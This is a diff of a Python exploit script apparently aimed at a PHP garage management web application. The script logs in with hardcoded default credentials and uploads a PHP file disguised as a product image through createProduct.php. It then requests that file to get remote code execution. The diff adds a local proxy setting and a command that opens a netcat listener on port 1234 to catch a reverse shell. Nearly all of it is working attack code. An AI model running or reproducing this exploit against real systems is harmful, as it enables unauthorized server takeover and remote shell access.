@@ -1,9 +1,14 @@
-import requests, string, sys, warnings, time, concurrent.futures
+import requests, subprocess, string, sys, warnings, time, concurrent.futures
 from requests.packages.urllib3.exceptions import InsecureRequestWarning
 warnings.simplefilter('ignore',InsecureRequestWarning)
 from netifaces import interfaces, ifaddresses, AF_INET
 
 req = requests.Session()
+
+proxies = {
+    'http':'http://127.0.0.1:8080', 
+    'https':'http://127.0.0.1:8080',
+    }
 
 def login(ip,username,password):  
     target = "http://%s/garage/garage/login.php" %ip
@@ -31,7 +36,7 @@ def creata_rs():
 def trigger_rce(req):
     creata_rs()
     target = "http://%s/garage/garage/php_action/createProduct.php" %ip
-    starttime = int(time.time())
+
     multipart_form_data = {
     "currnt_date": (None,""),
     "productImage": ("saitamang.php", open("saitamang.php", "rb")),
@@ -43,7 +48,9 @@ def trigger_rce(req):
     "productStatus" : (None,"1"),
     "create" : (None,"")
     }
+
     response = req.post(target, files=multipart_form_data)
+
     print("[$] Enjoy your RCE :)")
     req.get("http://%s/garage/garage/assets/myimages/saitamang.php" %ip)
 
@@ -62,6 +69,8 @@ if __name__ == "__main__":
         username = "mayuri.infospace@gmail.com"
         password = "rootadmin"
 
+        subprocess.call(['terminator', '-e', 'nc -lvp 1234'])
+        time.sleep(2)
         login(ip,username,password)
         
     except IndexError:
